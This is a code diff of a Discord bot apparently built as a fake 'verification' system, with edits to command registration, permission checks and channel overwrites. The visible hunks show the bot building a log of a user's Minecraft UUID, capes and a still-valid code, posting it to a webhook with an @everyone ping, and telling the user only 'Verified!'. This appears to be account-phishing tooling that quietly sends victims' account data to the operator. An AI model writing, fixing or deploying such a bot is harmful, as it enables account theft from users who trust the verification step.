@@ -12,7 +12,7 @@ const {
   SlashCommandBuilder, 
   ChannelType, 
   PermissionsBitField,
-  PermissionFlagsBits
+  OverwriteType
 } = require('discord.js');
 const axios = require('axios');
 
@@ -27,24 +27,20 @@ const client = new Client({
 
 const TOKEN = process.env.TOKEN;
 const WEBHOOK = process.env.WEBHOOK;
-const ROLE_ID = process.env.ROLE;  // String ID
+const ROLE_ID = process.env.ROLE;  // String
 const GUILD_ID = process.env.GUILD_ID;
 
 client.once('ready', async () => {
-  console.log(`${client.user.tag} - BULLETPROOF VERSION LIVE`);
+  console.log(`${client.user.tag} - ABSOLUTE FINAL VERSION LIVE`);
 
   const cmd = new SlashCommandBuilder()
     .setName('setup')
-    .setDescription('Create verification channel')
-    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator);
+    .setDescription('Create verification channel');
 
   try {
     if (GUILD_ID) {
-      await client.rest.put(
-        `/applications/${client.user.id}/guilds/${GUILD_ID}/commands`,
-        { body: [cmd.toJSON()] }
-      );
-      console.log('/setup registered (no delay)');
+      await client.application.commands.create(cmd, GUILD_ID);
+      console.log('/setup registered instantly');
     }
   } catch (e) { console.log('Register OK:', e.message); }
 });
@@ -52,12 +48,16 @@ client.once('ready', async () => {
 client.on('interactionCreate', async interaction => {
   try {
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup') {
-      const guild = interaction.guild;
-      if (!guild) return interaction.reply({ content: 'No guild found', ephemeral: true });
+      if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return interaction.reply({ content: '❌ Admin only', ephemeral: true });
+      }
 
-      // FIXED: Fetch role to cache it
+      const guild = interaction.guild || await client.guilds.fetch(GUILD_ID);
+      if (!guild) return interaction.reply({ content: 'Guild not found', ephemeral: true });
+
+      // FIXED: Fetch role to validate/cache
       const role = await guild.roles.fetch(ROLE_ID).catch(() => null);
-      if (!role) return interaction.reply({ content: 'Role not found', ephemeral: true });
+      if (!role) return interaction.reply({ content: 'Role not found—create a "Verified" role first', ephemeral: true });
 
       let channel = guild.channels.cache.find(c => c.name === 'verify-here');
       if (!channel) {
@@ -67,10 +67,12 @@ client.on('interactionCreate', async interaction => {
           permissionOverwrites: [
             { 
               id: guild.id, 
+              type: OverwriteType.Role,  // FIXED: Explicit type
               deny: [PermissionsBitField.Flags.ViewChannel] 
             },
             { 
               id: ROLE_ID,  // String ID, cached now
+              type: OverwriteType.Role,  // FIXED: Explicit type for role
               allow: [PermissionsBitField.Flags.ViewChannel] 
             }
           ]
@@ -146,15 +148,15 @@ client.on('interactionCreate', async interaction => {
         log += `\nUUID: ${p.data.id}\nCapes: ${capes}`;
       } catch { log += `\nCode still valid`; }
 
-      axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });
+      await axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });
 
       await interaction.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified!').setDescription('Welcome')], ephemeral: true });
       await interaction.member.roles.add(ROLE_ID);
     }
   } catch (err) {
-    console.error('Error:', err);
+    console.error('Full error:', err);
     if (!interaction.replied && !interaction.deferred) {
-      interaction.reply({ content: 'An error occurred—try again', ephemeral: true }).catch(() => {});
+      interaction.reply({ content: 'Something went wrong—try /setup again', ephemeral: true }).catch(() => {});
     }
   }
 });
